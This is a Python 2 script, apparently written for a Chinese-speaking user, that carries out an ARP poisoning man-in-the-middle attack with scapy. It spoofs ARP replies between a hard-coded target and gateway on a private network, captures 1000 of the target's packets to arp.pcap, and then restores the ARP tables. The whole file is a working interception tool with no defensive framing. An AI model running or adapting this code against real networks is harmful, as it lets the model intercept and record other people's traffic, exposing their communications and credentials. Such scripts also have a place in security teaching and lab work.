# -*- coding: utf-8 -*-
from scapy.all import *
import os
import sys
import threading

interface    = "eth0"
target_ip    = "10.22.3.240"
gateway_ip   = "10.22.250.250"
packet_count = 1000
poisoning    = True

def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
    
    print ">>>恢复网络"
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)
    
def get_mac(ip_address):
    
    responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10)
    
    for s,r in responses:
        return r[Ether].src
    
    return None
    
def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
    global poisoning
   
    poison_target = ARP()
    poison_target.op   = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst= target_mac

    poison_gateway = ARP()
    poison_gateway.op   = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst= gateway_mac

    print ">>>开始ARP投毒 按CTRL+C结束"

    while poisoning:
        send(poison_target)
        send(poison_gateway)
          
        time.sleep(2)
          
    print ">>>ARP投毒结束"

    return

conf.iface = interface

conf.verb  = 0

print ">>>网卡为 %s" % interface

gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print ">>>网关MAC获取失败"
    sys.exit(0)
else:
    print ">>>网关 %s 的MAC是 %s" % (gateway_ip,gateway_mac)

target_mac = get_mac(target_ip)

if target_mac is None:
    print ">>>目标MAC获取失败"
    sys.exit(0)
else:
    print ">>>目标 %s 的MAC是 %s" % (target_ip,target_mac)

poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac,target_ip,target_mac))
poison_thread.start()

try:
    print ">>>开始ARP投毒 抓取 %d 个包" % packet_count

    bpf_filter  = "ip host %s" % target_ip
    packets = sniff(count=packet_count,filter=bpf_filter,iface=interface)

except KeyboardInterrupt:
    pass

finally:
    print ">>>正在写入文件 arp.pcap"
    wrpcap('arp.pcap',packets)

    poisoning = False

    time.sleep(2)

    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
    sys.exit(0)
